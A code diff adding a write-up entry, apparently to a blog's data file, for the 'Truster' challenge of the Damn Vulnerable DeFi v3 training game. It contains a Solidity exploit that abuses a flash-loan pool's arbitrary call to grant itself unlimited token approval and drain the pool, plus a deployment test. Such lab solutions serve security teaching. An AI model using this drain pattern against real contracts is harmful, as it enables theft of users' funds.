@@ -47,5 +47,25 @@ contract Attack {
 });`,
             ],
         },
+        {
+            id: "damn-vulnerable-defi-solutions-3-truster",
+            title: `Damn Vulnerable DeFi v3 Solutions 3: Truster`,
+            description: `Solution for the 3rd Damn Vulnerable DeFi v3 challenge.`,
+            date: "January 12, 2023",
+            snippets: [
+                `function exploit(DamnValuableToken token, TrusterLenderPool pool, address receiver) external {
+    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+    pool.flashLoan(0, receiver, address(token), data);
+    token.transferFrom(address(pool), receiver, 1_000_000 ether);
+}`,
+                `it("Execution", async function () {
+    exploit = await (
+        await ethers.getContractFactory("Exploit", player)
+    ).deploy();
+
+    await exploit.init(token.address, pool.address, player.address);
+});`,
+            ],
+        },
     ],
 };
